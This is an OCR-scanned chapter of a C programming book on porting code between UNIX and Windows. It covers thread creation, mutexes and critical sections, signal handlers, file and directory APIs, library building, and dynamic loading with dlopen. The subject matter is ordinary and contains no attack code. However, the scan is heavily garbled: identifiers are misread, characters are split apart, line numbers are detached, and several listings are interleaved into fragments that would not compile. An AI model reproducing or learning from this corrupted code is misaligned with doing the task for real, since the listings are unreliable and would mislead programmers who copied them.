p**t"H Example 6.10 Thread Creation Using pthreads {threadl.c) 
2 
* threadl.c 
3 
-
4 
* 
5 
v 
6 
7 
ttinclude 
<stciio.h> 

Writing Portable Code * Chapters 
235 
8 tt include -cs tdl ib. h> 
9 
I include <p thread -~h> 
10 
11 
void *thread_entry_point; (void *arg) 
12 { 
13 
printf("thread 
2 ! \ r r ) ; 
14 } 
15 
16 int 
17 
main(void) 
18 < 
19 
pthread_t pt; 
20 
int 
ret = 0; 
21 
22 
ret = pthread_create(kpt, NULL, thread_entry_point, NULL); 
23 
i£(ret != 0x00) 
24 
( 
25 
printf("pthread_create () failed. \n-) ; 
26 
return (1); 
27 
} 
28 
29 
sleep(l) ; 
30 
3 1 
p r i n t f ( " t h r e a a 
l ! \ n " ) ; 
32 
33 
return(O) ; 
34 
} 
Example Execution 
Let's look at the UNIX output. 
UNIX Output 
mike@insidiae# ./threadl 
thread 2! 
thread 1! 
Analysis 
• 
At line 11, the thrcad_eiitr)>_poi)it() function is declared.This function will serve 
as the entry point for the new thread of execution created at line 22, and will 
print the message thread 2! when the thread executes. 
• 
At line 19, the variable pt of type pthrcad_t is declared. This variable is used to 
identify the thread that is created. 
• 
At line 22, the pthrcad_crcatc() function is used to create the new thread. 
• 
At line 29, the slecp() function is called to pause the calling thread for one 
second. 
• 
At line 31, the printf() function is called to display the thread 1! String. 

236 
Chapter 6 • Writing Portable Code 
The pthread_create function takes four arguments.The first argument is a pthread_t 
thread identifier. The second argument can be used to specify attributes for the thread 
and is of type ptliread_attrib.The third argument is the address of the function where the 
thread begins execution.This function address is also known as the thread entry point. The 
forth argument is an untyped pointer that can point to any value.This argument is 
passed as the sole argument to the thread entry point function when the thread begins 
execution. 
The Windows platform does not support the pthreads programming interface. It 
does, however, offer an alternative programming interface that provides much of the 
same functionality as the pthreads interface. 
The Windows equivalent of the pthread_create function is the CreateTltread function. 
Example 6.11 demonstrates the creation of a thread on the Windows platform using the 
CreateTltread function. 
IfVH^RCfl Example 6,11 Thread Creation Using the CreateThreadQ Function (thread2.c) 
1 
i 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
* t h r e a d 2 , c 
+ 
* 
*/ 
if i n c l u d e ^windows. h> 
# i n c l u d e 
< s t d i o . h > 
DWORD W1KAPI t h r e a d _ e n t r y _ p o i n t ILPVOID arg) 
1 
p r i n t f ( " t h r e a d 
2 J \ r \ n " ) j 
r e t u r n ( O ) ; 
} 
i n t 
main(void) 
C 
HANDLE h = NULL; 
h 
= CreateThreadfNULL, 0, 
t h r e a d _ e n t r y _ p o i n t , NULL, 
0, NULL); 
i £ ( h = NULL) 
( 
p r i n t f ( "CreateThread0 
f a i l e d . \ r \ n " ) ; 
r e t u r n ( 1 ) ; 
) 
Sleep(lOOO); 
p r i n t f ( " t h r e a d 
l ! \ r \ n " ) i 
r e t u r n ( O ) ; 
} 

Writing Portable Code • Chapter 6 
237 
Example Execution 
Let's look at the Win32 output. 
Win32 Output 
C:\Dociments and Settings\Mike\ 
My Documents\Visual Studio Projects\thread2\Debug>thread2.exe 
thread 2! 
thread 1! 
Analysis 
• 
At line 10, the thread_e>nry_point() function is declared.This function will serve 
as the entry point for the new thread of execution created at line 22, and will 
print the message thread 2! when the thread executes. 
• 
At line 20, the variable h of type HANDLE is declared. This variable is used to 
identify the thread that is created. 
• 
At line 22, the Win32-specific CreateThread(') function is used to create the 
new thread. 
• 
At line 29, the Win32-specific SIccpQ function is called to pause the calling 
thread for one second. 
• 
At line 31, the print/Q function is called to display the thread 1! string. 
The Win32-specific CreateThread function takes a number of arguments that can be 
used to configure the environment that the thread executes in. However, the thread 
entry point and thread argument values are the most important for the purposes of 
porting code that uses the pthread_create function to the CreateThread function. 
For more information on the CreateThread function, search the 
http://nisdn.microsoft.com Web site or Visual Studio documentation for CreateThread. 
Thread Coordination 
The POSIX threads interface and the Windows threads API both support the concept of 
mutually exclusive (mutex) locks. Mutex is a data construct used to coordinate access to 
resources between multiple threads. In short, one thread must "lock" the mutex before 
accessing a shared resource. Once the thread has finished accessing the locked resource, it 
must "unlock" the mutex. Another thread may then lock the mutex and access the 
shared resource following the same pattern. 
The POSIX threads interface provides the pt)iread_mutext_t data type and the 
pthread_mutex_init, pthrcad_mtitex_lock, ptliread_mutex_u>ilock, and pthread_mutex_destroy 
functions for creating, locking, unlocking, and destroying mutex variables. 
Example 6.12 demonstrates the use of the pthrcad_mutex family of functions and 
values to coordinate access to a global variable between two threads. 

238 
Chapter 6 • Writing Portable Code 
N £ fl E S i 
^s 
Example 6.12 Thread Coordination with the pthreadjnutexO Function 
I (thread3.c) 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
IS 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
/* 
* threads.c 
* 
* 
*/ 
#include <stdio.h> 
#include <pthread.h> 
U global vars.. 
pthread_mutex_t lock; 
id-;. 
void *thread 
[ 
while(l) 
( 
) 
) 
i n t 
main[void) 
{ 
pthread_ 
i n t 
r e t 
i f ( r e t ! 
( 
) 
r e t 
i f [ r e t ! 
{ 
) 
while(1) 
t 
g_val - 0; 
_entry_point (void *arg) 
pthread_mutex_lock(&lock); 
++g_val7 
printf("thread 2 , g_val: %d\n", g_val); 
pthread_mutex_unlocM&lock) ; 
ualeep(1000000}; 
t Pt; 
ret = 0; 
• pthrea.d„mutex_init(&lock, NULL}; 
= 0x00) 
printf ("pthread_mute>:_init () 
railed. \ n " ) ; 
return(1)j 
= pthread_create(Spt, NULL, thread_entry_point, ROLL); 
= 0x00) 
printf("pthread_create{) 
failed.\n") ; 
return(l); 
pthread_mutex_lock(&lock); 
++g_val: 
printf("thread 1 , g_val: %d\n"r g_val) ; 

Writing Portable Code • Chapter 6 
239 
55 
56 
pthread_jnutex_unlocM£loc)<:) ; 
57 
58 
usleeptlOOOOOO); 
59 
} 
60 
61 
pthread_mutex_deEtroy (&lock) ; 
62 } 
Example Execution 
Here is an example of the UNIX output. 
UNIX Output 
root^pplicationdefensetf . /thread^ 
thread 1 , g_val: 1 
thread 2 , g_val: 2 
thread 1 , g_val: 3 
Analysis 
• 
At line 8, the pthread.h header file is included.This header file is required for 
the pthread family of functions. 
• 
At line 11, the variable lock is declared as type pthread_uiutex_t.Thk variable is 
used to coordinate access between threads. If one thread locks the mutex, other 
threads must wait until the first thread unlocks the mutex. Once the mutex has 
been unlocked, a different thread can lock it and access the resource protected 
by the mutex. 
• 
At line 12, the variable g_val is declared as type mf. This variable is incremented 
by multiple threads and the value printed to stdout.This variable is protected by 
the loch mutex declared on line 12. 
• 
At line 14, the thrcad_cutry_poiut() function is declared.This function is the 
point where the new thread created at line 42 will begin executing. This func-
tion does little more than loop infinitely. On each loop, the global mutex lock 
variable is locked (line 18), the g_vcd variable is incremented (line 20), the value 
of the ,<,'_«!/ variable is printed (line 21), the global umtcx lock variable is 
unlocked (line 23), and the thread sleeps for one second (line 25). 
• 
At line 30, the maiu() function is declared.This function creates a new thread, 
then loops infinitely incrementing the global variable g_val. 
• 
At line 32, the pt variable is declared as type ^f/irtW_r. This variable is used to 
store a handle to the thread created at line 42. 
• 
At line 35, the pthread_mtttex_imt() function is used to initialize the global 
pthread_mutex_t lock variable. 

Chapter 6 • Writing Portable Code 
• 
At line 42, the plhread_createQ function is used to create a new thread. This 
thread executes the thread_am)>_poitu() function in a separate thread of execu-
tion. 
• 
At lines 49 through 59, an infinite loop is declared. On each loop, the global 
mutex lock variable is locked (line 51) , the g_vai variable is incremented (line 
53), the value of the $_v<i! variable is printed (line 54), the global nuttcx lock 
variable is unlocked (line 56), and the thread sleeps for one second (line 57). 
• 
At line 61, the pthread_mutex_destroyO function is used to destroy the global 
mutex lock variable. Because the while loop at line 49 never breaks, this function 
will not be called. 
The same functionality can be achieved on the Windows platform using the 
CriticcilSeclion family of functions and values. Example 6.13 demonstrates use of the 
CritkalSection interface in place of the ptlircad_inutex interface. 
Example 6.13 Thread Coordination with the CnticalSectionO Function (thread4.c) 
1 
/* 
2 
* thread4. c 
3 
• 
4 
-
5 
•/ 
6 
7 
it include <windows.h> 
8 
tf include <stdio.h> 
9 
10 
// global vara.. 
11 
CRITICAL_SECTION lock; 
12 
int 
g_val = 0; 
13 
14 
DWORD W1KAPI Ehread_encry_poinc (LPVOID arg) 
15 
{ 
16 
while (1) 
17 
{ 
18 
EnterCriticalSection(&lock); 
19 
20 
++g_val; 
21 
printf("thread 2 , g_val: %d\n"r g_val); 
22 
23 
LeaveCriticalSection(klock); 
24 
25 
SleepUOOO) ; 
26 
} 
27 
) 
28 
29 
int 
30 
main{void) 
31 t 
32 
HANDLE h 
= NULL; 
33 
int 
ret = 0; 
34 
35 
36 

Writing Portable Code • Chapter 6 
241 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 i 
h 
= CreateThreadfNULL, 0, t h r e a d _ e n t r y _ p o i n t , NULL, 
i f ( h == NULL) 
{ 
p r i n c f ( " C r e a t e T h r e a d ( 1 
f a i l e d . \ r \ n " ) ; 
r e t u r n ( l ) ; 
> 
while(1) 
{ 
E n t e r C r i t i c a l S e c t i o n t & l o c k } ; 
++g_val; 
p r i n t f l " t h r e a d 1 
, g_val: 
%d\n", 
g _ v a l ) ; 
LeaveCriticalSectiont&loclO ; 
SleepUOOO) ; 
} 
D e l e t e C r i t i c a l S e c t i o n t & l o c k ) ; 
r e t u r n ( O ) ; 
), NULL) 
Example Execution 
Lets look at the tlircad4.c output. 
Output 
C:\Documents and Settings\Mike\ 
My Documents\visual Studio Projects\thread4\Debug5-thread4.exe 
thread 
thread 
thread 
thread 
1 
2 
1 
2 
g_val 
g_val 
g_val 
g_val 
1 
y. 
3 
4 
Analysis 
At line 7, the windows.h header file is included.This header file is required for 
the CreateThread and CritkalScction family of functions. 
At line 11, the lock variable is declared as type CRITICAL_SECTION. This 
variable is used to coordinate access between threads in the same manner as 
the prhrcdd_intitcx_t variable declared in Example 6.12. 
At line 12, the g_wi variable is declared as type mf.This variable is incremented 
by multiple threads and the value is printed to stdotit in the same manner as 
Example 6.12. 
At line 14, the thrcad_cutry_point() function is declared.This function is the 
point at which the thread created at line 37 will begin executing.This function 
does little more than loop infinitely. On each loop, the global critical section 

Chapter 6 • Writing Portable Code 
variable is locked (line 18), the gjeal variable is incremented (line 20), the value 
of the g_val variable is printed (line 21), the global critical section variable is 
unlocked (line 23), and the thread sleeps for one second (line 25). 
• 
At line 30, the mtttttQ function is declared.This function creates a new thread, 
then loops infinitely, incrementing the global variable g_val. 
• 
At line 32, the /) variable is declared as type HANDLE. This variable is used to 
store a handle to the thread created at line 37. 
• 
At line 35, the InitiaiizcCriticalSection() function is used to initialize the global 
critical section variable. Note that this function has no return value, unlike the 
pthread_mutexjt{) function shown in Example 6.12. 
• 
At line 37, the CreateThreadQ function is used to create a new thread.This 
thread executes the thre<id_eutry_poirtt() function in a separate thread of execu-
tion. 
• 
At lines 44 through 54, an infinite loop is declared. On each loop, the global crit-
ical section variable is locked (line 46) , the£_Mj/ variable is incremented (line 
48), the value of the g_vai variable is printed (line 49), the global critical section 
variable is unlocked (line 51), and the thread sleeps for one second (line 53). 
• 
At line 56, the De!eteCnticaiSectioit(} function is used to destroy the global critical 
section variable. Because the while loop at line 44 never breaks, this function will 
not be called. 
Signals 
Most UNIX operating systems provide support for signals. Signals are used as software 
interrupts and are sent to running programs to indicate that some event has occurred, or 
optionally as a form of inter-process communication (SIGUSR1, SIGUSR2). 
Processes on UNIX systems start with a set of default signal handlers.These signal 
handlers are functions that are called when a particular signal is sent to the program. 
Some default signal handlers take no action while others terminate the program. 
In the UNIX environment, typing the key sequence CTRL-C results in the 
sending of the SIGINT signal to the foreground program. By default, the signal handler 
for the SI GIN'!' signal terminates the running program. However, a custom signal han-
dler can be implemented to catch the signal and handle it. Example 6.14 shows usage of 
the signal facility to catch and handle the SIGINT signal. This example is cross-platform 
compatible. 
Example 6.14 Program Executed by the signalQ Function (signal.c) 
1 
/« 
2 
* signal.c 
3 
* 
4 
* tMrx/Win32 compatible 
5 
•/ 
6 

Writing Portable Code * Chapters 
7 
#include -csignal . h> 
8 
9 
void sighandler 
{int sig) 
10 t 
11 
// special signal handling. 
12 > 
13 
14 int 
15 main(vaid) 
16 [ 
17 
signal(SIGINT, sighandler); 
18 ) 
Analysis 
, ( : 
i' 
I 
•• 
* 
• 
At line 7, the signal,ft header file is included.This header file is required for the 
signalQ function and signal constant values. 
• 
At line 9, the sigh and Serf) function is declared. This is an example signal handler 
function. 
• 
At line 16, the signal() function is used to set the sighandler{) function declared 
at line 9 as the signal handler for the SIGINT signal.Thus, when the program 
is run, if it receives the SIGINT signal, the sighandlcrQ function will be called 
to handle the signal. 
The Windows platform supports only a subset of the signal values available on most 
UNIX platforms.These supported values are: 
• 
SIGABRT 
• 
SIGFPE 
• 
SIG1LL 
• 
SIGINT 
• 
SIGSEGV 
• SIGTEBM 
In addition, the constant SIG_DTL can be used to reset the default signal handler 
for a particular signal. The SIG_IGN constant can be used to ignore a signal so that it is 
never received by the program. Example 6.15 demonstrates use of the SIG_DFL and 
SIGJGN 
values. 
Example 6.15 The Signal() Function and the SIG_DFL and SIGJGN Values 
(stgna/2. c) 
1 /* 
2 
* sigttal2.q 
3 * 
4 
' 
5 
-t 
6 

244 
Chapter 6 • Writing Portable Code 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
#include <signal.h> 
void s i g h a n d l e r 
( i n t sig) 
( 
} 
int 
// special signal handling.. . 
main(void) 
< 
) 
// sec SIGINT signal handler 
signal(SIGINT, sighandler); 
// ignore SIGFPE signal 
signal(SIGFPE, SIG_IGN 
); 
// set SIGINT signal handler to default 
signal(SIGINT, 
SIG_DFL 
); 
Analysis 
• 
At line 7, the signal.It header file is included. This header file is required for the 
signalQ function and signal constant values. 
• 
At line 9, the sighandlerQ function is declared.This is an example signal handler 
function. 
• 
At line 18, the signaiQ function is used to set the sigltaudkrQ function as the 
handler for the SIGINT signal. 
• 
At line 21, the signalQ function is used to specify that the process will ignore 
the SIGFPE signal by specifying the SIG_IGN constant as the value of the 
signal handler argument. 
• 
At line 24, the signalQ function is used to reset the signal handler for the 
SIGINT signal. It is set to the default signal handler by specifying the 
SIG_DTL value as the signal handler argument. 
If a signal is handled in a UNIX program that is not available by default on the 
Windows platform, custom handling of the signals must be implemented by the devel-
oper. 
For more information on support for signals on the Windows platform, search the 
http://msdn.microsoft.com Web site or Visual Studio documentation for "signal." 
File Handling 
The UNIX and Windows platforms both support the American National Standards 
Institute (ANSI) standard file-handling functions for opening, reading, writing, and 
closing files. As a result, it is simple to port UNIX file handling code to the Windows 
platform. Example 6.16 demonstrates the use of the file handling API to create a new 
file, write a single line of text, and close the file on the UNIX platform. 

Writing Portable Code • Chapter 6 
245 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
imple 6.16 File Handling with the F-
/* 
* 
filel.c 
* UNIX/Wiri32 compatible. 
#include <;stdic.h> 
#define 
FILE_NAMB 
" t e s t . tXt* 
int 
main(void) 
{ 
FILE * f p t r = NULL; 
f p t r 
= fopen(FILE_NAME, 
"w"); 
i f i f p t r == NULL) 
{ 
printf (*fopent) 
failed.\rr ) 
return(1); 
} 
fprintf(fptr, 
' t e s t ! " ) ; 
£close 
(fptr)j 
return(0); 
} 
Analysis 
• 
At line 7, the sttiio.lt header file is included for the file APIs. 
• 
At line 9, the name of the test file to be opened is specified. In this example, 
the value test.txt is hard-coded. 
• 
At line 14, the variable fptr is defined as type pointer to FILE,This variable is 
used to store the file descriptor returned from the fopetiQ function. 
• 
At line 16, the fopciiQ function is called to open the file I-'ILB_.\:AM1£, with 
"write-only" access. 
• 
At line 23, thefyrintff) function is used to write the test! string to the file. 
• 
At line 25, thefdoseQ function is used to close the file descriptor. 
Note that on the Windows platform, when processing data in a binary file, the file 
must be opened as a binary file using the /J mode identifier. Example 6.17 demonstrates 
the use of the b mode identifier. 
The Windows platform also provides compatibility functions for the UNIX open, 
read, write, and close system calls. However, these functions can only be used for working 
with files. They cannot be used in conjunction with socket descriptors. Note that the io.h 
header file is required for compiling the open, read, write, and close functions.The fottt.h 

246 
Chapter 6 • Writing Portable Code 
>«i> 
header file is required in order to use the mode values passed to the open function. 
Example 6.17 demonstrates use of the opai family of functions to create, write to, and 
close a file. 
Example 6.17 File Handling with OpenQ, ReadQ, WriteO, and CloseO Functions 
{file2.c) 
1 /* 
2 
* file2,c 
3 
* 
4 
* Win32 open function example 
5 
-/ 
6 
7 
(include -=5tdio.h> 
8 frinclude <:io.h> 
// required for open, write, close functions 
9 
#include <fcntl.h> 
// required for open modes (_0_CREAT, etc} 
10 
11 
int 
12 
main (void) 
13 ( 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 j 
int ret = 0; 
int fd 
= 0; 
fd 
= o p e n r t e s t . t x t " , _0_CREAT j _o_WRONLY} 
i f ( f d < 
0) 
{ 
printf("open() 
failed.\r\n"); 
return(1I; 
) 
ret 
= write[fd, "abc", 0x03); 
i f l r e t != 0x031 
! 
printf("writeO 
failed.\r\n H}; 
close 
(fd); 
returntl ); 
) 
close 
(fd); 
return{0 ); 
Analysis 
At lines 7 through &, the stdio.h, io.h, andJcntl.h header files are included.These 
header files are required for the openQ, WfiteQ, and closeQ functions. 
At line 15, the variable fd is declared as type integer.This variable is used to 
save the file descriptor returned from the openQ function. Unlike the /open() 
function, the openQ function returns an integer value. 
At line 17, the openQ function is called ro open the test.txt file if the create does 
not exist (_0_CR.BA'l) and write-only (_0_WRONLY) access. 

Writing Portable Code • Chapter 6 
247 
. 
r 
- 
i 
•• 
• 
At line 24, the writeQ function is called to write the abc string to the file. 
• 
At line 32, the cioseQ function is called to close the file descriptor identified by 
the variable /(/. 
Directory Handling 
The programming interface for directory handling on most UNIX platforms differs 
from the programming interface on the Windows platform. However, the programming 
interface provided by the Windows platform provides equivalent functionality and adds 
the capability to filter listed files through the use of a "glob-matching" expression. 
Example 6. IS demonstrates the use of the UNIX directory handling programming 
interface to list all files and directories in the program's current working directory. 
Example 6.18 UNIX-Compatible Directory Handling (dirl.c) 
1 i -
2 
* dirl.c 
3 
* 
•4 * UNlJt directory listing example. 
5 
v 
6 
7 #include <stdicuh> 
8 #include <direnc. h> 
9 
10 #define DIR_*IAME 
11 
12 int 
13 main(void) 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 } 
struct dirent *dp 
= NULL; 
DIR 
*dirp - NULL; 
dirp 
• opendir(DIR_NAME); 
if[dirp == NULL) 
{ 
printf("opendir() 
failed.\n"); 
re turn(1); 
) 
dp = readdir(dirpl; 
whileldp != NULL) 
{ 
printf("DIR: %s\n"H dp->d_name); 
dp = readdir(dirp); 
) 
closedir{dirp) ; 
return(O) ; 

248 
Chapter 6 • Writing Portable Code 
Analysis 
• 
At lines 7 and 8, the stdio.lt and direiit.h header files are included.These header 
files are required for the print/Q and directory listing functions. 
• 
At line 10, the directory name to list is declared. 
• 
At line 15, the variable dp is declared as type struct dirent *. This variable is used 
to store data for each entry in the directory to be listed. 
• 
At line 16, the variable dirp is declared as type DIR *. This variable is used to 
store the directory descriptor returned from the opeudirQ function. 
• 
At line 18, the opeudirQ function is called to open the dir DIR_I\'AME 
(declared at line 10) and assign a directory descriptor to the dp variable. 
• 
At line 25, the readdirQ function is called to get the first dj rectory entry struc-
ture (struct dirent) of the directory listing. 
• 
At lines 27 through 32, the readdirQ function is called repeatedly to process 
each directory entry in the directory. The readdirQ function returns a NULL 
value when no more directory entries exist, causing the loop to end. 
• 
At line 34, the closcdirQ function is called to close the directory descriptor vari-
able dirp. 
The Windows equivalent of the dirl.c program requires using the FindFirstFUe family 
of functions as illustrated in Example 6.19. 
ll^lllL Example 6.19 Win32-Compatible Directory Handling (dir2.c) 
2 
* dir2.c 
3 * 
4 
* Win32 directory listing example. 
5 
••/ 
6 ttinclude <windows.h> 
7 tt include <stdio.h> 
8 
9 
(define DIR_NAME 
»,\\*« 
10 
11 int 
12 
main{void) 
13 ( 
14 
WIN32_FIND_DATA 
fileData 
15 
HANDLE 
h F i l e = NULL ; 
16 
BOOL 
r e t 
B FALSE; 
17 
18 
memset (ifileData, 
0x00, 
s i z e o f (WIN32_FIND_DATA) ) ; 
19 
20 
HFile 
= FindFirstFile(DIR_NAME, 
ifileData) ; 
21 
i f l h F i l e == INVALID_SiANELE_VALUE) 
22 
{ 
23 
p r i n t f (" F i n d F i r s t F U e I) 
f a i l e d , \r-\n") ; 
24 
r e t u r n ( l ) ; 
25 
} 

Writing Portable Code • Chapter 6 
249 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 : 
:
•
:
'
:
: 
{ 
i 
?i 
ile(TRUE) 
p r i n t f ( 
// 
next 
ret 
i f ( r e t 
( 
) 
ndClose(hFile) 
return(O) ; 
'DIR: 
% s \ r \ n " , fileData.cFileName) 
file in d i r 
= F i n d N e x t F i l e l h F i l e , 
SfileDatal ; 
!= TRUE) 
break; 
i 
Analysis 
• 
At lines 6 and 7, the windows.h and stctio.Ii header files are included. These 
header files are required for the printfQ, memsetQ, and Find functions. 
• 
At line 9, the directory name to list is declared.The \\* string is appended to 
the directory name to indicate to the FindFirstFileQ function that all entries in 
the directory should be listed, 
• 
At line 14, the variableJikData is declared as type WIN32_FIND_DATA.This 
variable is used to store data for each entry in the directory to be listed. 
• 
At line 15, the variable liFile is declared as type HANDLE.This variable is used 
to store the directory handle returned from the FindFirstFileQ function. 
• 
At line 20, the FindFirstFileQ function is called to open the dir DIR_NAME 
(declared at line 9) and assign a directory handle to the It File variable. 
• 
At lines 27 through 327, the FindNcxtFilcQ function is called repeatedly to 
process each directory entry in the directory.The FindNextFileQ function pop-
ulates the fileData variable for each directory entry and returns TRUE until no 
additional directory entries are found. 
• 
At line 34, the FindCloseQ function is called to close the directory descriptor 
variable 11 File. 
The dirl.c program performs the same operation as the dirl.c program, but using the 
FindFirstFile family of functions. One significant difference is in the DIR_I\AME con-
stant, instead of simply indicating the directory to list.it includes tlic \\* vulue.Tlus 
value is a glob expression indicating that any file or directory should be listed. The glob 
expression can be further refined to only list certain files or directories. For example, the 
DIR_NAME constant can be modified to contain the .\\*.c value. In this case, only files 
ending in x will be returned by the FileFirstFile and FiudNextFile functions. 

250 
Chapter 6 • Writing Portable Code 
For more information on the FindFirstFiie function, search the 
http://msdn.microsoft.com Web site or Visual Studio documentation for"FindFirstFile." 
The Windows platform supports the getat'd function for obtaining the path of the cur-
rent working directory. Example 6.20 demonstrates use of the getcwd function on the 
Windows platform. Note that the direct.h header file is required to use the gctai'd function. 
Example 6.20 The Getcwd() Function {getcwdl .c) 
1 / * 
2 
* getcwdl.c 
3 * 
4 
* Win32 getcwd() example. 
5 
*i 
6 
7 
^include <;stdio.h> 
8 
#include <direct. h> // required for getcvd() function 
9 
10 
ttdefine 
BUF_SIZE 1024 
11 
12 int 
13 
main [void) 
14 i 
15 
char buf [BUF_SIZE] ; 
16 
17 
if(getcwd(buf, BUF_SIZE) == NULL) 
18 
( 
19 
printf("getcwdl) £ailed.\r\n"I; 
20 
return(l); 
21 
) 
22 
23 
printfI"CWE: %s", buf); 
24 
25 
return(O) ; 
26 t 
Analysis 
• 
At lines 7 and 8, the stdio.h and direct.Ii header files are included.These header 
files are required for the priiitj'0 and getcwdQ functions. 
• 
At line 17, the getcwdQ function is called to get thejUepatk of the current 
working directory. 
• 
At line 23, the current directory is printed to stdout. 
Libraries 
Both the UNIX and Windows platforms support static and dynamically linked libraries. 
On UNIX platforms, dynamically linked libraries are usually referred to as si tared objects 
or shared iibyarics. On the Windows platform, dynamically linked libraries are referred to 
as dynamically linked libraries (DLLs). 

Writing Portable Code • Chapter 6 
251 
Creation of static libraries on both platforms yields a single binary file containing 
the compiled code of the library. The compilation of a shared library on a UNIX system 
yields a single file containing the compiled code of the library.The compilation of a 
DLL on the Windows platform yields two files, the first file containing linkage informa-
tion (.lib) and the second file containing the compiled code in library form (.dll). 
The only significant change required for compiling a library on the Windows plat-
form is that functions to be exported from the library must be explicitly declared using a 
pre-compile directive.The following two examples, 6,21 (libl.c) and 6.22 (libl.c), 
demonstrate the difference in authoring a simple library on the UNIX and Windows 
platforms. 
Zjj^l 
Example 6.21 
UNIX Library Header and Implementation (libl.h, libl.c) 
2 
* l i b l . h 
3 
* 
4 
' 
5 
v 
6 
7 
ttifndef 
LIB1_K 
8 
Sdeflne 
LIB1_H 
9 
10 t* 
11 
* libl_tesU) 
12 
* 
13 
' 
14 
v 
15 
void libl_test 
[J; 
16 
17 
Vendif /* 
LIB1_H 
*/ 
18 
19 
l i b l . c : 
20 
21 /* 
22 
* l i b l . c 
23 
-
24 
• 
25 
v 
26 
27 
((include "libl.h" 
28 
#include <;stdioTh> 
29 
30 f» 
31 
* l i b l _ t e s t l ) 
32 
> 
33 
• 
34 
•/ 
35 
void libl_test U 
36 
( 
37 
princf ("libl_test! ") ; 
38 
) 

252 
Chapter 6 • Writing Portable Code 
^ M ^ Example 6.22 Win32 Port of Example 6.21 (Iib2.h, Iib2.c) 
2 
l i b 2 . h : 
3 
4 /* 
5 
* l i b 2 . h 
6 
* 
7 
* Windows p o r t . 
8 
v 
9 
10 
ttifndef 
LIB2_H 
11 
#define 
LIB2_H 
12 
13 
ftinclude 
<windows.h> 
14 
15 /* 
16 
* H b 2 _ t e s t ( ) 
17 
* 
18 
* 
1 9 
V 
20 
__declspec{dlle:Kport} v o i d l i b 2 _ t e s t 
(J ; 
21 
22 
#endif 
f . 
LIB2_H_ */ 
23 
24 
2 5 
l i b 2 , c : 
26 
27 /* 
28 
* lib2.c 
29 
* 
30 
* Windows p o r t • 
31 
•/ 
32 
3 3 
^ i n c l u d e 
" l i b 2 . h " 
34 
8 i n c l u d e 
<stdio.h> 
3 5 
3 6 
/* 
37 
* l i b 2 _ t e s t < ) 
38 
• 
3 9 
• 
4 0 
- / 
41 
void l i b 2 _ t e s t 
0 
4 2 
{ 
4 3 
p r i n t f ( " I i b 2 _ t e s t ! " ) ; 
4 4 
} 
Dynamic Loading of Libraries 
At times, it is useful to dynamically load shared libraries. This functionality can be used to 
implement system calls as is done on the Windows platform, to abstract a programming 
interface from its implementation, or to implement an application plug-in framework. 
On UNIX platforms, the programming library libdl is commonly used for dynamic 
loading of shared libraries. In fact, libdl is used in the nmon example program in this 
chapter to implement support for plug-ins. 

Writing Portable Code • Chapter 6 
253 
Libdl provides three functions that are of interest: 
• 
So pen 
• 
dlsym 
• 
die lose 
The dlopen function is used to open a shared library. An identifier is returned from 
the function that identifies the opened Iibrary.This identifier is then used in conjunction 
with the dlsym to obtain the addresses of functions within the opened library. 
The dlsym function is used to obtain the address of a function within a hbrary previ-
ously opened with dlopen. 
The dlclose function is used to release the identifier obtained by calling the dlopen 
function. 
Example 6.23 demonstrates usage of the dlopen, dlsym, and dlelose functions to open 
a shared library, obtain the address of a function, call the function, and then close the 
library. 
" • * " " Example 6.23 UNIX Dynamic Library Example (dll.c) 
1 /* 
2 
* dll.c 
3 * 
4 • 
5 
*/ 
6 
7 
#include <stdicTh> 
O #include <dlfcn.h> 
9 
10 
ftdefine 
SO_PATH 
"/home/mike/book/test .so" 
1 1 
#define 
SYMBOL 
"_function_name" 
12 
13 
int 
14 
main(void) 
15 c 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
void 
void 
h 
i f ( h . 
{ 
} 
fp 
i f ( f p 
{ 
1 
f p O r 
t*fp) 
( ) ; 
'h = NULL; 
= dlopen(SO_PATH, DL_LAZ¥); 
== HULL) 
p r i n t f ( " d l o p e n { } 
f a i l e d . \ n " ) ; 
re turn (1) ; 
= dlsym (h, SYMBOL) ; 
== NULL) 
d l c l o s e ( h ) ; 
p r i n t f 
("dlsyrM) 
f a i l e d , 
symbol n o t 
found.\n") 
r e t u r n 
t l ) : 

254 
Chapter 6 • Writing Portable Code 
35 
3 6 
d l c l o s e ( h ) ; 
37 
38 
r e t u r n 
(0) ; 
39 } 
Analysis 
• 
At lines 7 and 8, the stdio.h and dtfai.Ii header fdes are included.These header 
files are required for the priiitf() and dt family of functions. 
• 
At line 10, the path to the shared library to be dynamically loaded is declared. 
• 
At line 11, the name of the function to be dynamically linked is declared. In 
this case, we use the function name Junction _ii<inie as an example. Note that an 
underscore is prefixed to the name of the function; this is required when 
dynamically linking functions on the UNIX platform, when using the dt 
library, and by shared libraries compiled with GCC. 
• 
At line 16, we declare function pointer variable fp, that will be used to store 
the address of the function SYMBOL when it is linked. 
• 
At line 19, the dtopaiQ function is called to open the shared library that the 
function will be dynamically linked to. 
• 
At line 26, the dlsymQ function is called to link the function. 
• 
At line 34, the linked function is called via the fp function pointer. 
• 
At line 36, the handle to the shared library is closed using the dlcloscQ function. 
The Windows platform provides functions for dynamic loading of libraries that map 
quite nicely to the libit! functions.These functions are: 
• 
Load Library 
n 
GetPratAddress 
• 
I rce Library 
Usage of these functions is nearly the same as their iibdi counterparts. Example 6.24 
demonstrates porting of the dlf.c example program to the Windows platform. 
